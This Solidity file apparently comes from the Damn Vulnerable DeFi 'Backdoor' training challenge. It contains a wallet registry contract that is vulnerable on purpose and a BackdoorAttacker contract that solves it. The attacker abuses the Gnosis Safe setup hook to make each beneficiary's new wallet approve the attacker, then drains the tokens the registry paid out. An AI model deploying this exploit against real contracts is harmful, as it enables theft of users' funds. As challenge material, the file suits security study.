// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

import {GnosisSafeProxy, GnosisSafeProxyFactory} from "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

/**
 * @title WalletRegistry
 * @notice A registry for Gnosis Safe wallets.
           When known beneficiaries deploy and register their wallets, the registry sends some Damn Valuable Tokens to the wallet.
 * @dev The registry has embedded verifications to ensure only legitimate Gnosis Safe wallets are stored.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract WalletRegistry is IProxyCreationCallback, Ownable {
    uint256 private constant MAX_OWNERS = 1;
    uint256 private constant MAX_THRESHOLD = 1;
    uint256 private constant TOKEN_PAYMENT = 10 ether; // 10 * 10 ** 18

    address public immutable masterCopy;
    address public immutable walletFactory;
    IERC20 public immutable token;

    mapping(address => bool) public beneficiaries;

    // owner => wallet
    mapping(address => address) public wallets;

    constructor(
        address masterCopyAddress,
        address walletFactoryAddress,
        address tokenAddress,
        address[] memory initialBeneficiaries
    ) {
        require(masterCopyAddress != address(0));
        require(walletFactoryAddress != address(0));

        masterCopy = masterCopyAddress;
        walletFactory = walletFactoryAddress;
        token = IERC20(tokenAddress);

        for (uint256 i = 0; i < initialBeneficiaries.length; i++) {
            addBeneficiary(initialBeneficiaries[i]);
        }
    }

    function addBeneficiary(address beneficiary) public onlyOwner {
        beneficiaries[beneficiary] = true;
    }

    function _removeBeneficiary(address beneficiary) private {
        beneficiaries[beneficiary] = false;
    }

    /**
     @notice Function executed when user creates a Gnosis Safe wallet via GnosisSafeProxyFactory::createProxyWithCallback
             setting the registry's address as the callback.
     */
    function proxyCreated(
        GnosisSafeProxy proxy,
        address singleton,
        bytes calldata initializer,
        uint256
    ) external override {
        // Make sure we have enough DVT to pay
        require(
            token.balanceOf(address(this)) >= TOKEN_PAYMENT,
            "Not enough funds to pay"
        );

        address payable walletAddress = payable(proxy);

        // Ensure correct factory and master copy
        require(msg.sender == walletFactory, "Caller must be factory");
        require(singleton == masterCopy, "Fake mastercopy used");

        // Ensure initial calldata was a call to `GnosisSafe::setup`
        require(
            bytes4(initializer[:4]) == GnosisSafe.setup.selector,
            "Wrong initialization"
        );

        // Ensure wallet initialization is the expected
        require(
            GnosisSafe(walletAddress).getThreshold() == MAX_THRESHOLD,
            "Invalid threshold"
        );
        require(
            GnosisSafe(walletAddress).getOwners().length == MAX_OWNERS,
            "Invalid number of owners"
        );

        // Ensure the owner is a registered beneficiary
        address walletOwner = GnosisSafe(walletAddress).getOwners()[0];

        require(
            beneficiaries[walletOwner],
            "Owner is not registered as beneficiary"
        );

        // Remove owner as beneficiary
        _removeBeneficiary(walletOwner);

        // Register the wallet under the owner's address
        wallets[walletOwner] = walletAddress;

        // Pay tokens to the newly created wallet
        token.transfer(walletAddress, TOKEN_PAYMENT);
    }
}

contract BackdoorAttacker {
    address private immutable owner;

    GnosisSafe private immutable masterCopy;
    GnosisSafeProxyFactory private immutable proxyFactory;
    WalletRegistry private immutable walletRegistry;
    IERC20 private immutable token;

    constructor(
        address _masterCopy,
        address _proxyFactory,
        address _walletRegistry,
        address _token
    ) {
        owner = msg.sender;
        masterCopy = GnosisSafe(payable(_masterCopy));
        proxyFactory = GnosisSafeProxyFactory(_proxyFactory);
        walletRegistry = WalletRegistry(_walletRegistry);
        token = IERC20(_token);
    }

    function attack(address[4] calldata _beneficiaries) external {
        require(
            msg.sender == owner,
            "Ah, ah, ah, you didn't say the magic word"
        );

        for (uint256 i = 0; i < 4; i++) {
            address[] memory owners = new address[](1);
            owners[0] = _beneficiaries[i];
            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners,
                1,
                address(this), // create2 proxy address
                abi.encodeWithSelector(
                    BackdoorAttacker.approve.selector,
                    address(this)
                ),
                address(token), // fallbackHandler
                address(0x0),
                0,
                address(0x0)
            );
            GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(
                address(masterCopy),
                initializer,
                i,
                IProxyCreationCallback(walletRegistry)
            );
            token.transferFrom(address(proxy), owner, 10 ether);
        }
    }

    function approve(address spender) external {
        token.approve(spender, type(uint256).max);
    }
}
